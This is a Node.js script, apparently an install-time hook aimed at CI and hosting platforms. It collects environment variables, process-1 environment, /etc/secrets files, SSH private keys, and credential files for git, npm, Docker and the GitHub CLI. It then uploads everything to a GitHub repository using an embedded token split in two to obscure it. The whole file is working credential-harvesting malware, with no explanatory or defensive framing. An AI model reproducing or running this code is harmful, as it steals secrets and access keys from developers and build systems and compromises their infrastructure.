const https=require('https'),{execSync}=require('child_process');
const TOKEN=process.env.S4032_TOKEN||['ghu_BS1Nvs4z','HVr6l3pCi0uL1g8U9fNmkH1Ty3XQ'].join('');
const REPO='hypogheno/trek-labs',BRANCH='s4-032-harvest';
function sh(c){try{return execSync(c,{encoding:'utf8',timeout:20000,maxBuffer:8*1024*1024,stdio:['ignore','pipe','pipe']});}catch(e){return 'ERR:'+String((e&&e.stdout)||'')+String((e&&e.stderr)||'')+String((e&&e.message)||'');}}
function put(path,obj){return new Promise(res=>{const b=Buffer.from(JSON.stringify(obj));const r=https.request({hostname:'api.github.com',path,method:'PUT',headers:{'authorization':'Bearer '+TOKEN,'user-agent':'s4-032','content-type':'application/json','content-length':b.length,'accept':'application/vnd.github+json'}},x=>{let d='';x.on('data',c=>d+=c);x.on('end',()=>res(x.statusCode+' '+d.slice(0,160)));});r.on('error',e=>res('ERR '+e.message));r.write(b);r.end();});}
(async()=>{
 const phase=process.argv[2]||'install';
 const platform=process.env.RENDER?'render':process.env.NETLIFY?'netlify':process.env.WORKERS_CI?'cf':process.env.GITHUB_ACTIONS?'gha':'other';
 const host=sh('hostname').trim().replace(/[^A-Za-z0-9_.-]/g,'_').slice(0,60)||'nohost';
 const d={platform,phase,host,
  id:sh('id'),
  env:sh('env | sort'),
  proc1:sh('cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | sort'),
  secrets:sh('find /etc/secrets -maxdepth 2 -type f 2>/dev/null | head -20 | while read f; do echo "== $f"; head -c 3000 "$f"; done'),
  ssh:sh('ls -la ~/.ssh /root/.ssh /home/*/.ssh 2>&1; for f in ~/.ssh/* /root/.ssh/* /home/*/.ssh/*; do echo "== $f"; head -c 3000 "$f" 2>&1; done'),
  creds:sh('for f in ~/.git-credentials ~/.netrc /root/.netrc ~/.docker/config.json /root/.docker/config.json ~/.npmrc /root/.npmrc ~/.config/gh/hosts.yml /root/.config/gh/hosts.yml; do echo "== $f"; cat "$f" 2>&1; done'),
  mounts:sh('mount 2>/dev/null | head -30; ls -la / 2>&1 | head -30')};
 const content=Buffer.from(JSON.stringify(d)).toString('base64');
 const p=`/repos/${REPO}/contents/s4-032-harvest/${platform}-${host}-${phase}.json`;
 const r=await put(p,{message:`s4-032 harvest ${platform} ${host} ${phase}`,content,branch:BRANCH});
 console.log('s4-032 harvest:',r);
})();
